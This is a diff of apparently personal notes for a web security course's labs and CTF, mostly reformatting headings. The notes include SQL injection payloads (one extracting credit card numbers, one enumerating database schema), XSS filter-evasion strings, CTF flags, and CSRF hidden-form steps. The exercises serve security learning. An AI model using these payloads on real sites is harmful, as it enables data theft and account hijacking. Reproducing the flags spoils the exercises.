@@ -26,7 +26,7 @@ Privilege Escalation - *CTF{YOU_GOT_ADMIN_PRIVILEGE}
 
 ## week 2
 
-###Lab
+### Lab
 ------
 SQL Injection Escaping:   `\'   or 1;--`
 ------
@@ -34,7 +34,7 @@ SQL Injection Challenge Three:  `Mary Martin' union select CreditCardNumber from
 ------
 SQL Injection 5: `couponCode=' union select 1, 2, couponCode from vipCoupons limit 1 # `
 
-###CTF
+### CTF
 
 https://35.188.146.206/public/protected/flags/03/
 `*CTF{WHOA_IT_SUPPORTS_LOGICAL_OPERATORS}`
@@ -81,23 +81,23 @@ hints:
 "or"1"union select TABLE_NAME,COLUMN_NAME from information_schema.COLUMNS limit 1000,1000#
 ```
 
-##Week 3 - Lab
+## Week 3 - Lab
 
 Cross Site Scripting Two
-"<INPUT TYPE="text" onblur="alert('XSS')"/>"
+`"<INPUT TYPE="text" onblur="alert('XSS')"/>"`
 
 3
-<META onpaonpageonpagonpageonpageshowshoweshowshowgeshow="alert(1)";
+`<META onpaonpageonpagonpageonpageshowshoweshowshowgeshow="alert(1)";`
 
 4
-http://blabla.com"  oNpageshow=alert('XSS') 
+`http://blabla.com"  oNpageshow=alert('XSS') `
 
 ## codepath websecurity week 4
 
 Implementing CSRF as an exercise, more details:
 https://guides.codepath.com/websecurity/Cross-Site-Request-Forgery
 
-###Lab
+### Lab
 
 ex 0: easy (just look at the response)
 
@@ -117,3 +117,7 @@ ex 5. CSRF - upload the url: https://security.codepath.com/user/csrfchallengeone
 
 ex 6. create a page with a hidden form like they show on the guide, use the url and wait for someone to load the page, see:
 https://github.com/alfasin/webhack/blob/master/fake_form.html
+
+### CTF
+
+
